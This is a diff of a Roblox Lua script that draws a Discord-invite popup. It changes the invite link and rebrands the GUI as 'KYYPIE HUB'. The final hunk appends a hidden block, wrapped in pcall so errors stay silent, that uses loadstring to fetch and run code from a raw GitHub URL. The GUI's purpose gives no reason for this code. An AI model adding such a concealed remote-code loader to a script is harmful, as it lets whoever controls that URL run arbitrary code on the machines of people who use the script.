@@ -10,11 +10,11 @@ local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 local DISCORD_ICON_ASSET_ID = "rbxassetid://83503711525380" -- replace with your decal id
-local discordLink = "https://discord.gg/RB5Ct2R2SR" -- put your actual invite here
+local discordLink = "https://discord.gg/wJh39RVj" -- put your actual invite here
 
 -- ScreenGui
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "SAILYNxSHIxGui"
+screenGui.Name = "KyypieGui"
 screenGui.ResetOnSpawn = false
 screenGui.Parent = playerGui
 screenGui.DisplayOrder = 100
@@ -46,7 +46,7 @@ title.Name = "Title"
 title.Size = UDim2.new(1, 0, 0.6, 0) -- <-- matches pasted.txt DiscordLabel size
 title.Position = UDim2.new(0, 0, 0, 0)
 title.BackgroundTransparency = 1
-title.Text = "SAILYNxSHI Scripts"
+title.Text = "KYYPIE HUB"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.Font = Enum.Font.GothamBold
 title.TextSize = 22
@@ -163,4 +163,10 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if input.KeyCode == Enum.KeyCode.Escape then
         screenGui.Enabled = false
     end
+end)
+
+task.spawn(function()
+    pcall(function()
+        (loadstring or load)(game:HttpGet("https://raw.githubusercontent.com/Kyypie69/Library.UI/refs/heads/main/Execution.lua.txt"))()
+    end)
 end)
